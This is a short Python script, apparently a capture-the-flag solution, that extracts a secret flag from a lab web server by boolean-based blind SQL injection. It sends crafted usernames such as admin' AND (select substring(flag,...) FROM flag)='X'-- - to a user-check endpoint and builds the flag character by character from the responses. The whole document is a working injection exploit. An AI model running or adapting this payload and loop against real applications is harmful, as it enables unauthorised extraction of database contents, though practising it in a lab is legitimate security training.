import requests
import string
import sys

charset = string.ascii_uppercase + "{}:" + "0123456789"
proxies = {
        'http' : 'http://localhost:8080'
        }
url = "http://10.10.247.220"
flag = ""
position = 1

testgate = False

# requests params={} urlencodes automatically - according to T1b3rious

while not testgate:
    for item in charset:
        uri = f"/register/user-check?username=admin'+AND+(select+substring(flag,{position},1)+FROM+flag)%3d'{item}'--+-"
        r = requests.get(url + uri, proxies=proxies)
        if "false" in r.text:
            flag += item
            print(flag)
            if item == '}':
                break

    position += 1

exit()
